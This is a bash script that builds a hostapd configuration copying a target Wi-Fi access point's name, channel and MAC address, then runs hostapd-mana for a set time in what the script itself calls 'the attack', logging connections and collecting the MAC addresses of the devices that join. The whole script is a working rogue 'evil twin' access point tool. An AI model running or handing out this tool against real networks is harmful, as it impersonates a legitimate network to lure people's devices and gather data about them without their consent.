#!/bin/bash

# Check if the correct number of arguments are provided
if [ "$#" -ne 6 ]; then
    echo "Usage: $0 <interface_selected> <AP_ssid> <channel> <AP_MAC> <wpa_passphrase> <duration>"
    exit 1
fi

# Assign arguments to variables
interface_selected="$1"
AP_ssid="$2"
channel="$3"
AP_MAC="$4"
wpa_passphrase="$5"
duration="${6:-30}"  # Default duration is 30 seconds if not provided

# Make interface predictable name
interface_wlx=$(ip link show $interface_selected | awk '/link\/ieee802.11\/radiotap/ {print $2}' | sed 's/://g' | awk '{print "wlx"$1}')

# Determine the real user's home directory
real_user=$(logname 2>/dev/null || echo $SUDO_USER)
config_file="/home/$real_user/src/work/target_hostapd.conf"

# Adjust the hostapd config
echo "interface=$interface_wlx" > $config_file
echo "ssid=$AP_ssid" >> $config_file
echo "channel=$channel" >> $config_file
echo "hw_mode=g" >> $config_file
echo "bssid=$AP_MAC" >> $config_file
echo "wpa=3" >> $config_file
echo "wpa_key_mgmt=WPA-PSK" >> $config_file
echo "wpa_pairwise=TKIP CCMP" >> $config_file
echo "wpa_passphrase=$wpa_passphrase" >> $config_file
echo "auth_algs=3" >> $config_file

#testlogging
echo "logger_syslog=-1" >> $config_file
echo "logger_syslog_level=2" >> $config_file
echo "logger_stdout=-1" >> $config_file
echo "logger_stdout_level=2" >> $config_file

#pause
sleep 5

# Get the interface up and ready
sudo ifconfig $interface_wlx up

#pause
sleep 5

# Function to extract unique MAC addresses and save to a file
extract_and_save_macs() {
    grep -v 'Using interface' /home/pi/src/work/$AP_ssid-mana.log | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}' | sort | uniq > /home/pi/src/work/$AP_ssid-mana-unique-macs.txt
}

# Trap SIGINT (Ctrl+C) and SIGTERM to run the extract_and_save_macs function before exiting
trap 'extract_and_save_macs; sudo kill $!; exit' SIGINT SIGTERM

# Run the attack for the specified duration
sudo /home/$real_user/src/hostapd-mana/hostapd/hostapd -i $interface_wlx $config_file 2>&1 | sudo tee -a /home/pi/src/work/$AP_ssid-mana.log &
sleep $duration

# If the script reaches this point, extract MAC addresses and kill the hostapd-mana process
extract_and_save_macs
sudo kill $!
